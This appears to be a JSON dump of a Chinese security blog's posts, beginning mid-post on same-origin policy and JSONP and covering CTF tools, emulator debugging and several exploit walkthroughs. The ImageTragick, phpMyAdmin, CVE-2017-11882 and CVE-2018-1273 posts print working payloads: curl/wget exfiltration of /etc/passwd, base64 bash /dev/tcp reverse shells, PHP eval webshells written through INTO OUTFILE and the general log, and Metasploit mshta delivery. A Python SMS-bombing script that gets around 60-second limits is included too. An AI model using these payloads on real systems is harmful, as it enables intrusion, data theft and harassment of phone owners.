允许跨域加载的三个标签123&lt;img src=&quot;&quot; /&gt;&lt;link href=&quot;&quot; /&gt;&lt;script src=&quot;&quot;&gt;&lt;/script&gt; script并无跨域限制, 这是因为script标签引入的文件不能够被客户端的 js 获取到, 不会影响到原页面的安全, 因此script标签引入的文件没必要遵循浏览器的同源策略. 相反, ajax 加载的文件内容可被客户端 js 获取到, 引入的文件内容可能会泄漏或者影响原页面安全, 故, ajax必须遵循同源策略. 0x06 绕过跨域 SOP 带来安全，同时也会带来一定程度的麻烦，因为有时候就是有跨域的需求。绕过跨域的方案由于篇幅所限，并且网上也很多相关文章，所以不在这里展开解决跨域的方案，只给出几个关键词： 对于 ajax 使用 JSONP jsonp是将请求通过动态创建一个“script”标签的方式来将请求发送出去的，所以不是XMLhttpRequest请求，浏览器就不会进行拦截校验。 AJAX的使用与平常无异，只需要将dataType改为jsonp即可 12345678910var result; $.ajax(&#123; url: &apos;http://restapi.amap.com/v3/direction/driving?origin=116.45925,39.910031&amp;destination=116.587922,40.081577&amp;output=json&amp;key=5f5b33e5a55685fac26237601cd58a49&apos;, dataType: &quot;jsonp&quot;, jsonp: &quot;callback&quot;, //与服务端约定的函数名cache:true, //是否需要缓存，如果这里没有配置缓存，那么请求的URL还会有一个参数 success: function(json)&#123; result = json; &#125; &#125;); 服务端接收到以后，只需要手动判断一下有无callback再手动拼一对括号即可,这里以java为例 1234567891011@ResponseBody@RequestMapping(value=&quot;xxx&quot;)public String testJsonp(String callback) &#123; Student result = new Student(); //响应结果之前，判断是否为jsonp请求 if (StringUtils.isNotBlank(callback)) &#123; //把结果封装成一个js语句响应 return callback + &quot;(&quot; + JsonUtils.objectToJson(result) + &quot;);&quot;; &#125; return JsonUtils.objectToJson(result);&#125; 后端进行 CORS 配置 后端反向代理 使用代理方式跨域更加直接，因为SOP的限制是浏览器实现的。如果请求不是从浏览器发起的，就不存在跨域问题了。 使用本方法跨域步骤如下： 把访问其它域的请求替换为本域的请求 本域的请求是服务器端的动态脚本负责转发实际的请求 首先在 conf\\apiserver-reverse-proxy-conf\\bingli\\main.conf ，没有相关目录和文件就新建 123456location ~* ^/uc/.*&#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://192.168.10.111:8080;&#125; 然后在nginx主配置文件添加加粗内容，即把代理文件加载进来 12345location / &#123; root html; index index.html index.htm; &#125;include apiserver-reverse-proxy-conf/bingli/main.conf; 123456重启nginx，之后ajax发请求到http://localhost/uc/aahttp://localhost/uc/bb?token=xxxx都会被转发到http://192.168.10.111:8080/uc/aahttp://192.168.10.111:8080/uc/bb?token=xxxx 对于 iframe 使用 location.hash 或 window.name 进行信息交流 使用 postMessage 0x07 sop无法防御csrf 我们通过原理就可以发现。CSRF是指 A 网站正常登陆后，cookie 正常保存，用户访问攻击者网站 B ，通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie，来完成攻击。 SOP 首先就是“禁止跨域请求”，这样描述也不是很合法。本质上 SOP 并不是禁止跨域请求，而是在请求后拦截了请求的回应。 发现，SOP 不阻止接口请求而是拦截请求结果。 而CSRF 恰恰占了这两个便宜，所以 SOP 不能作为防范 CSRF 的方法。 0x08 SOP 与 ajax 对于 ajax 请求，在获得数据之后你能肆意进行 js 操作。这时候虽然同源策略会阻止响应，但依然会发出请求。因为执行响应拦截的是浏览器而不是后端程序。事实上你的请求已经发到服务器并返回了结果，但是迫于安全策略，浏览器不允许你继续进行 js 操作，所以报出你熟悉的 blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.。 所以再强调一次，同源策略不能作为防范 CSRF 的方法。 跨域是浏览器限制","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"CTF中常见的加解密集合","slug":"CTF-常见的加解密集合","date":"2019-01-07T20:25:40.000Z","updated":"2019-09-25T08:48:06.828Z","comments":true,"path":"2019/01/08/CTF-常见的加解密集合/","link":"","permalink":"http://www.vkxss.top/2019/01/08/CTF-常见的加解密集合/","excerpt":"","text":"CTF中常见的加解密集合 CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 今天我们来聊聊CTF中杂项遇到过的常见的加解密吧！ 转载-原文链接 整理了几个免费的解密网站（长按跳转） http://ctf.ssleye.com/ https://www.qqxiuzi.cn/ https://www.ctftools.com/down/ https://tool.bugku.com/?wafcloud=1 http://www.nicetool.net","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.vkxss.top/categories/CTF/"}],"tags":[{"name":"加解密集合","slug":"加解密集合","permalink":"http://www.vkxss.top/tags/加解密集合/"}]},{"title":"Mac下使用夜神模拟器调试","slug":"APP-Mac下使用夜神模拟器调试","date":"2018-12-18T20:25:40.000Z","updated":"2020-05-11T04:09:00.519Z","comments":true,"path":"2018/12/19/APP-Mac下使用夜神模拟器调试/","link":"","permalink":"http://www.vkxss.top/2018/12/19/APP-Mac下使用夜神模拟器调试/","excerpt":"","text":"1、遇到的问题： 1.1、描述： 1.2、解决： 1、遇到的问题：1.1、描述： 首先去夜神官网下载mac版最新app，吐槽一下，内置应用很不爽，那么Mac使用夜神模拟器调试，遇到adb无法连接夜神模拟器，怎么办？ 1.2、解决： 使用adb devices命令会发现，没有此设备，添加设备，网上有很多方法，主要是将usb文件号加入adb_usb.ini中，不赘述。再次运行adb devices，发现还是找不到设备，使用了一个取巧的办法，夜神模拟器的服务默认监听在62001端口，所以使用adb connect 127.0.0.1:62001 夜神模拟器 adb connect 127.0.0.1:62001 逍遥模拟器 adb connect 127.0.0.1:21523 网易mumu adb connect 127.0.0.1:7555 通过adb connect命令利用TCP/IP协议来连接。 进入设备","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"Imagetragick 命令执行漏洞","slug":"CVE-2016–3714","date":"2018-10-12T07:30:08.000Z","updated":"2019-12-03T06:38:58.591Z","comments":true,"path":"2018/10/12/CVE-2016–3714/","link":"","permalink":"http://www.vkxss.top/2018/10/12/CVE-2016–3714/","excerpt":"","text":"漏洞简介 影响版本： 漏洞挖掘 利用方式： Reference 漏洞简介 Imagetragick 命令执行漏洞在16年爆出来以后，wooyun上面也爆出了数个被该漏洞影响的大厂商，像腾讯， 新浪，慕课….影响巨大，这里贴出wooyun上关于此漏洞的案例：http://wooyun.org/bugs/wooyun-2016-0205125 ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。 但有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。 国外的安全人员为此新建了一个网站： https://imagetragick.com/ 与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717， 其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 影响版本： ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在) ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在) 低版本至6.9.3-9 released 2016-04-30 漏洞挖掘 上传头像 上传照片 插入图片 等等 利用方式： Poc代码： 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| curl dnslog&quot;)&apos;pop graphic-context 执行命令，构造POC： 读取/etc/passwd 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| wget --post-file /etc/passwd dnslog&quot;)&apos;pop graphic-context 执行命令，构造POC： 如果接收到http请求，说明curl命令执行成功。 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/joker.jpg&quot;|curl &quot;192.168.0.132:4444)&apos;pop graphic-context 构造反弹shell，POC： 这里的 /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.132/4444 0&gt;&amp;1 需要用base64加密 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/bmjoker.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMzIvNDQ0NCAwPiYx | base64 -d | bash`&quot;||id &quot; )&apos;pop graphic-context Reference https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html https://www.anquanke.com/post/id/83871 https://wooyun.x10sec.org/static/bugs/wooyun-2016-0214787.html https://wooyun.x10sec.org/static/bugs/wooyun-2016-0205530.html","categories":[{"name":"CVE-2016","slug":"CVE-2016","permalink":"http://www.vkxss.top/categories/CVE-2016/"}],"tags":[{"name":"CVE-2016–3714","slug":"CVE-2016–3714","permalink":"http://www.vkxss.top/tags/CVE-2016–3714/"}]},{"title":"绕过一分钟限制短信轰炸","slug":"Python-短信轰炸脚本","date":"2018-10-12T04:25:40.000Z","updated":"2019-11-20T05:09:48.519Z","comments":true,"path":"2018/10/12/Python-短信轰炸脚本/","link":"","permalink":"http://www.vkxss.top/2018/10/12/Python-短信轰炸脚本/","excerpt":"","text":"一分钟短信轰炸脚本 一分钟短信轰炸脚本 当前后端校验60秒倒计时时，使用该脚本进行短信轰炸 12345678910111213141516171819202122232425262728293031323334#coding=utf-8# python 3.6.0import requestsimport randomimport time import jsonheaders=&#123; &quot;Host&quot;: &quot;qq.com&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Referer&quot;: &quot;https://qq.com/mng/&quot;, &quot;Cookie&quot;: &quot;XXX&quot;, &#125;def Send(): try: url = &quot;https://qq.com/&quot; data = &#123;&quot;phone&quot;:&quot;number&quot;,&quot;_qq_csrf&quot;:&quot;5d184ad253da6af72fec3106bfe3e8f79fa5a502&quot;&#125; # data为json数据 # res = requests.post(url=url,headers=headers,data=json.dumps(data)) res = requests.post(url=url,headers=headers,data=data) print (&apos;Phone:number&apos; + &apos;ReturnValue:&#123;&#125;&apos;.format(res.text)) except Exception as e: print(e)if __name__==&quot;__main__&quot;: for i in range(30): time.sleep(65) Send()","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"DOCX文件弹出XSS","slug":"渗透测试-DOCX文件弹出XSS","date":"2018-07-28T07:30:08.000Z","updated":"2019-09-22T17:11:51.250Z","comments":true,"path":"2018/07/28/渗透测试-DOCX文件弹出XSS/","link":"","permalink":"http://www.vkxss.top/2018/07/28/渗透测试-DOCX文件弹出XSS/","excerpt":"","text":"背景： 如何使用Microsoft Word文档（docx格式）将跨站点脚本（XSS）漏洞上传到Web服务器 支持在线读取word文档 或者允许上传html文件，浏览器并成功解析(Content-Type为text/html) 构造XSS弹框word 方式一： Microsoft Word文档的核心是一个包含XML和Word文件; 我们可以通过运行Linux命令strings file-sample.docx来查看文件中所有的ASCII字符，以查看可用的字符串; 将文件解压缩，方便我们在不损坏文件的情况下，修改它； 例如修改settings.xml为aaaaaaaaa.xml; 然后输入zip -r 重新打包，生成新文件; 利用ultraedit文本编辑器查看十六进制代码块找到A的字符串,并修改为js代码; 12345# strings file-sample.docx# unzip file-sample.docx# cd word# mv settings.xml aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xml# zip -r test.docx * 方式二： 直接利用ultraedit文本编辑器找到word文档空白位置,在不破坏文档的情况下，修改为JS代码保存即可; 防护措施 这样的效果对于开发者来说应该采取以下手段来进行限制。 文件上传之前，在服务器端验证上传文件格式是否为.doc或.docx有效格式； 严格限制Content-Type头，对Content-Type头或特定后缀格式更改过的上传文件须保持与上传文件相同的Content-Type头信息； 控制文件下载时的其它操作情况，添加响应标头:“Content-Disposition: attachment”，以防止在浏览器中内嵌显示文件； 过滤掉所有包含HTML标签的上传，因为docx可经压缩篡改其中包含的HTML文件。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"PhpMyadmin_Getshell","slug":"渗透测试-PhpMyadmin_Getshell","date":"2018-06-17T07:30:08.000Z","updated":"2020-03-09T15:49:08.675Z","comments":true,"path":"2018/06/17/渗透测试-PhpMyadmin_Getshell/","link":"","permalink":"http://www.vkxss.top/2018/06/17/渗透测试-PhpMyadmin_Getshell/","excerpt":"","text":"phpmyadmin_getshell 0x01 into outfile 0x02 利用日志getshell phpmyadmin_getshell 当发现存有phpmyadmin目录时，进而通过弱口令或者暴力破解进入数据库之后，如何getshell? 写入WebShell主要条件： Root数据库用户（root权限） 网站绝对路径（确定有写入权限） magic_quotes_gpc：Off（关闭） 写入WebShell其它条件： magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\\”反斜杠。 secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。 file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。 0x01 into outfile 0x001前提条件： 1.Root数据库用户（root权限） 2.网站绝对路径（确定有写入权限） 12345暴绝对路径phpMyAdmin/libraries/select_lang.lib.phpphpMyAdmin/darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=1phpmyadmin/themes/darkblue_orange/layout.inc.php 3.查看能否自定义导入导出数据到任意目录的权限 12345678查看能否自定义导出文件目录的权限 show global variables like &quot;%secure%&quot;; //查询secure_file_priv配置 secure_file_prive=null //不允许导入导出数据到目录 secure_file_priv=c:\\sec //允许导入导出数据到指定目录 secure_file_priv=&apos;&apos; //允许导入导出数据到任意目录 secure_file_priv=&quot;/&quot; //允许导入导出数据到任意目录 注：在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为&quot;&quot;或&quot;/&quot;，重启MySQL服务！ 0x002 导入一句话shell 123select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/xampp/htdocs/1.php&apos;; select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\\\xampp\\\\htdocs\\\\2.php&apos;;select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\\\xampp\\\\htdocs\\\\3.php&apos;; 0x003 测试写入phpinfo文件 select ‘‘ into dumpfile ‘c:\\xampp\\htdocs\\phpinfo.php’; 0x02 利用日志getshell 0x001 前提条件： 要求mysql的版本为5.0以上，因为5.0以上会创建日志文件 要求对日志有可读可写的权限 0x002 原理 phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell 0x003 日志备份获取shell show global variables like “%genera%”;//查询general_log配置 当前的状态是off，需要手动开启日志，输入以下命令： set global general_log=’on’; 也可以修改配置文件永久修改： 1234vim /etc/mysql/my.cnf//在 [mysqld] 后面添加general_log_file = /var/log/mysql/query.loggeneral_log = on 然后再次查询general_log配置已变成ON，设置Webshell日志文件保存路径，Mysql会判断日志文件是否存在，如果不存在则会自动创建。输入以下命令： SET global general_log_file=’c:/xampp/htdocs/rizhi.php’; 查看日志文件保存路径，对应的就会生成rizhi.php文件 一句话写入日志文件 关闭 general_log模式 set global general_log=’off’; 使用蚁剑连接","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Office远程代码执行漏洞(CVE-2017-11882)","slug":"CVE-2017-11882","date":"2018-05-08T07:30:08.000Z","updated":"2019-10-09T06:03:11.171Z","comments":true,"path":"2018/05/08/CVE-2017-11882/","link":"","permalink":"http://www.vkxss.top/2018/05/08/CVE-2017-11882/","excerpt":"","text":"漏洞概述 影响范围 复现环境 漏洞复现 修复 漏洞概述此漏洞是由Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。 影响范围12345office 2003 office 2007 office 2010 office 2013 office 2016 复现环境123渗透机：Kali Linux + POC代码 靶机：Win10 + Office 2016工具已打包：https://github.com/vkbiu/CVE/tree/master/CVE-2017-11882 漏洞复现 生成word文档test.doc，打开doc文件之后，会弹出计算器（以此验证offce漏洞） 1python Command43b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc win10 office2016触发成功(win10会报毒) 在Kali Linux上构造带有shell后门的word文件，并开启监听。 把cve_2017_11882.rb复制到/usr/share/Metasploit-framework/modules/exploits/windows/smb 再Copycve-2017-11882.rtf复制到/usr/share/metasploit-framework/data/exploits 启动metasploit 123456789101112131415161718192021222324252627282930313233343536373839Metasploit running on Kali Linux as root, using system databaseA database appears to be already configured, skipping initialization .:okOOOkdc&apos; &apos;cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: &apos;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&apos; oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO. cOOOOOOO.MMM.OOc.MMMMM&apos;oOO.MMM,OOOOOOOc oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl ;OOOO&apos;MMM.OOOO.MMM:OOOO.MMM;OOOO; .dOOo&apos;WM.OOOOocccxOOOO.MX&apos;xOOd. ,kOl&apos;M.OOOOOOOOOOOOO.M&apos;dOk, :kk;.OOOOOOOOOOOOO.;Ok: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . =[ metasploit v5.0.53-dev- ]+ -- --=[ 1931 exploits - 1079 auxiliary - 332 post ]+ -- --=[ 556 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]msf5 &gt; search 11882Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/fileformat/office_ms17_11882 2017-11-15 manual No Microsoft Office CVE-2017-11882 1 exploit/windows/smb/cve_2017_11882 2017-11-21 excellent No Microsoft Office Word Equation Editor RCE 使用CVE-2017-11882.rb模块，开启Meterpreter监听会话： 1234567891011121314151617msf5 &gt; use exploit/windows/smb/cve_2017_11882 #使用模块msf5 exploit(windows/smb/cve_2017_11882) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp #设置tcp反弹会话msf5 exploit(windows/smb/cve_2017_11882) &gt; set lhost 192.168.36.131lhost =&gt; 192.168.36.131 #设置攻击机ip地址msf5 exploit(windows/smb/cve_2017_11882) &gt; set uripath 11882 #设置路径为11882，可自定义uripath =&gt; 11882msf5 exploit(windows/smb/cve_2017_11882) &gt; exploit[*] Exploit running as background job 2.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.36.131:4444 msf5 exploit(windows/smb/cve_2017_11882) &gt; [*] Generating command with length 44[+] msf.rtf stored at /root/.msf4/local/msf.rtf[*] Using URL: http://0.0.0.0:8080/11882[*] Local IP: http://192.168.36.131:8080/11882[*] Server started. 利用mshta，生成目标机的漏洞文档，命令如下： 12root@kali:~# python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.36.131:8080/11882&quot; -o 11882.doc[*] Done ! output file --&gt; 11882.doc 将生成的文件拷贝到win10靶机中运行，即在kali中可以看到 成功后，使用命令sessions 查看你控制的pc 修复 在线更新，开启Windows Update更新。 打补丁，此漏洞对应的微软补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882","categories":[{"name":"CVE-2017","slug":"CVE-2017","permalink":"http://www.vkxss.top/categories/CVE-2017/"}],"tags":[{"name":"CVE-2017-11882","slug":"CVE-2017-11882","permalink":"http://www.vkxss.top/tags/CVE-2017-11882/"}]},{"title":"CVE-2018-1273-RCE","slug":"CVE-2018-1273","date":"2018-04-13T07:30:08.000Z","updated":"2019-10-10T07:14:19.570Z","comments":true,"path":"2018/04/13/CVE-2018-1273/","link":"","permalink":"http://www.vkxss.top/2018/04/13/CVE-2018-1273/","excerpt":"","text":"漏洞概述 影响范围 复现环境 漏洞复现 修复建议 Reference 漏洞概述 Spring Data Commons组件中存在远程代码执行漏洞（CVE-2018-1273），攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。 影响范围 受影响的版本 Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10(Ingalls SR10) Spring Data Commons 2.0 - 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5(Kay SR5) 官方已经不支持的旧版本 不受影响的版本 Spring Data Commons ≥ 2.0.6 Spring Data Commons ≥ 1.13.11 Spring Data REST 2.6.11 (Ingalls SR11) Spring Data REST 3.0.6 (Kay SR6) Spring Boot 1.5.11 Spring Boot 2.0.1 复现环境 docker环境搭建： https://github.com/knqyf263/CVE-2018-1273 漏洞POC： https://github.com/vkbiu/CVE/tree/master/cve-2018-1273 漏洞复现 漏洞利用POC： 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;cp /etc/passwd /tmp&apos;)]=123 进入docker容器查看/tmp/目录下成功cp /etc/passwd文件 反弹shell payload： 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xOTIvNTU3NyAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=123 修复建议 官方已经在最新版本中修复了该漏洞，请受影响的用户尽快升级，以保证长期有效的防护。下载链接请参考下表： 组件版本 下载链接 Spring Data Commons 2.0.6 https://github.com/spring-projects/spring-data-commons/archive/2.0.6.RELEASE.zip Spring Data Commons 1.13.11 https://github.com/spring-projects/spring-data-commons/archive/1.13.11.RELEASE.zip Spring Data REST 3.0.6 https://github.com/spring-projects/spring-data-rest/archive/3.0.6.RELEASE.zip Spring Data REST 2.6.11 https://github.com/spring-projects/spring-data-rest/archive/2.6.11.RELEASE.zip Spring Boot 2.0.1 https://github.com/spring-projects/spring-boot/archive/v2.0.1.RELEASE.zip Spring Boot 1.5.11 https://github.com/spring-projects/spring-boot/archive/v1.5.11.RELEASE.zip Reference http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/","categories":[{"name":"CVE-2018","slug":"CVE-2018","permalink":"http://www.vkxss.top/categories/CVE-2018/"}],"tags":[{"name":"CVE-2018-1273","slug":"CVE-2018-1273","permalink":"http://www.vkxss.top/tags/CVE-2018-1273/"}]}]}